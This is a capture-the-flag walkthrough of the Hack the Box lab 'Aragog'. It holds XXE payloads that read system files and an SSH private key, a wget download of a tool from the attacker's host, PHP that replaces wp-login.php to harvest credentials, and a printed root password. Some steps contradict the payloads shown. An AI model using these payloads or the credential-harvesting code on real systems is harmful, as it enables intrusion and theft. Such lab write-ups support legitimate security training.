@@ -1,0 +1,475 @@
+
+								
+																		Hack the Box: Aragog Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 30, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello Friends!! Today we are going to solve another CTF Challenge “Aragog”. This VM is also developed by Hack the Box, Aragog is a Retired Lab and there are multiple ways to breach into this VM.
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Table of Content
+Scanning
+
+Open ports and Running services (Nmap)
+
+Enumeration
+
+FTP anonymous login
+Web Directory Enumeration
+
+Exploit XXE
+
+Intercept Browser request (Burp Suite)
+Access /etc/passwd file
+Steal SSH RSA key
+
+Access Victim’s shell (SSH login)
+
+Capture user.txt flag
+
+Privilege Escalation
+
+Capture root.txt flag
+
+Let’s Begin!!
+As these labs are only available online, therefore, they have a static IP. Aragog Lab has IP: 10.10.10.78.
+Now, as always let’s begin our hacking with the port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.78
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.78
+					
+				
+			
+		
+
+Looking around its result we found ports 21, 22 and 80 are open. Moreover, we notice FTP anonymous login is allowed.
+
+Enumeration 
+So we try to connect with FTP through anonymous login. Here I found the test.txt file in the current directory. Then with the help of get command, we downloaded the test.txt file in our local machine.
+
+		
+		
+			
+			
+			
+			
+ftp 10.10.10.78
+ls
+get test.txt
+cat test.txt
+			
+				
+					
+				
+					1234
+				
+						ftp 10.10.10.78lsget test.txtcat test.txt
+					
+				
+			
+		
+
+inside test.txt file we observe something related to a subnet_mask in XML format, at this point, I was confused where I can implement this hint.
+
+Then we open target IP over web browser but didn’t found any remarkable thing here.
+
+When we found nothing at port 80, then though to use dirbuster for web directory brute-force attack.
+
+Here I found a /hosts.php file from its result.
+
+When I have explored /hosts.php in the web browser I found a message “There are 4294967294 possible hosts for” as shown below image. So I search in Google for 4294967294 hosts which were related to 255.255.255.254 as found in the above test.txt file.
+It means we can post the test.txt file here with help of burp suite.
+
+Exploit XXE (XML External Entity)
+So let’s capture the request and sent the intercepted data into the repeater.
+
+As we have predicted the test.txt is in XML format so we have tried to validate XXE injection.
+
+		
+		
+			
+			
+			
+			
+&lt;details&gt;
+&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+&lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;
+			
+				
+					
+				
+					1234
+				
+						&lt;details&gt;&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;&lt;test&gt;&lt;/test&gt;&lt;/details&gt;
+					
+				
+			
+		
+
+Luckily we found this is vulnerable to XXE injection.
+
+Hence now I can simply exploit it for fetching /etc/passwd file with help of following XXE script and then check its response.
+
+		
+		
+			
+			
+			
+			
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:////etc/issue" &gt;]&gt;
+&lt;details&gt;
+&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+&lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;
+			
+				
+					
+				
+					12345678
+				
+						&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:////etc/issue" &gt;]&gt;&lt;details&gt;&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;&lt;test&gt;&lt;/test&gt;&lt;/details&gt;
+					
+				
+			
+		
+
+Great!! We got the /passwd file successfully and enumerated two local usernames.
+
+With the help of /passwd file information, we try to get id_rsa through XXE script.
+
+		
+		
+			
+			
+			
+			
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:////home/florian/.ssh/id_rsa" &gt;]&gt;
+&lt;details&gt;
+    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+    &lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;
+			
+				
+					
+				
+					12345678
+				
+						&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:////home/florian/.ssh/id_rsa" &gt;]&gt;&lt;details&gt;    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;    &lt;test&gt;&lt;/test&gt;&lt;/details&gt;
+					
+				
+			
+		
+
+Yuppiee! We got the ssh private key successfully, that I copied in the text file and named as key.
+
+Then assign permission 600 to saved key (id_rsa) and then try to connect with SSH as we knew the port 22 was open in the victim’s network.
+
+		
+		
+			
+			
+			
+			
+cd Desktop
+chmod 600 key
+ssh -i key florian@10.10.10.78
+			
+				
+					
+				
+					123
+				
+						cd Desktopchmod 600 keyssh -i key florian@10.10.10.78
+					
+				
+			
+		
+
+And as you can observe that we get login successfully and accessed the TTY shell of victim’s machine, now let’s find the user.txt file to finish the 1st task.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd florian
+ls
+cat user.txt
+			
+				
+					
+				
+					12345
+				
+						cd /homelscd florianlscat user.txt
+					
+				
+			
+		
+
+1st task is completed; let’s find out root.txt to finish the 2nd task.
+
+Privilege Escalation 
+Inside /var/www/html we saw /dev_wiki and it was good to see that this folder holds WordPress setup and configuration files.
+
+So I simply add host IP: 10.10.10.78 and hostname: aragog is our local host file which is present inside /etc.
+
+So we explore aragog/dev_wiki in our web browser and got the WordPress home page.
+
+As you can observe inside /blog we found a message to Florian from Cliff where he had to express the mess of WordPress restoring in very few minutes.
+
+So with help of Google, I found a script pspy32s and download it in victim’s VM inside /tmp and also gave execution permission.
+pspy is a command line tool designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+wget http://10.10.14.6/pspy32s
+chmod +x pspy32s
+			
+				
+					
+				
+					123
+				
+						cd /tmpwget http://10.10.14.6/pspy32schmod +x pspy32s
+					
+				
+			
+		
+
+
+After the particular time, we realize that there is a cron job that is frequently deleting the dev_wiki folder &amp; replacing it with the backup folder &amp; a script wp-login.py is ran shortly after that process occurs.
+
+Now let’s manipulate the content of the wp-login.php file and place a new php code inside it to enumerate username and password.
+
+		
+		
+			
+			
+			
+			
+echo "" &gt; wp-login.php
+nano wp-login.php
+			
+				
+					
+				
+					12
+				
+						echo "" &gt; wp-login.phpnano wp-login.php
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+&lt;?php
+$req_dump = print_r($_REQUEST, TRUE);
+$fp = fopen('/tmp/request.log', 'a');
+fwrite($fp, $req_dump);
+fclose($fp);
+?&gt;
+			
+				
+					
+				
+					123456
+				
+						&lt;?php$req_dump = print_r($_REQUEST, TRUE);$fp = fopen('/tmp/request.log', 'a');fwrite($fp, $req_dump);fclose($fp);?&gt;
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cat wp-login.php
+			
+				
+					
+				
+					1
+				
+						cat wp-login.php
+					
+				
+			
+		
+
+ 
+So this file will dump the credential after a few minutes inside /tmp.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+cat creds.txt
+			
+				
+					
+				
+					12
+				
+						cd /tmpcat creds.txt
+					
+				
+			
+		
+
+Administrator: !KRgYs(JFO!&amp;MTr)lf
+Hmm!!! We got the admin credential.
+
+Now let’s grab the root.txt file quickly and finish this task.
+
+		
+		
+			
+			
+			
+			
+su root
+cd /root
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						su rootcd /rootcat root.txt
+					
+				
+			
+		
+
+We finished both tasks successfully!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
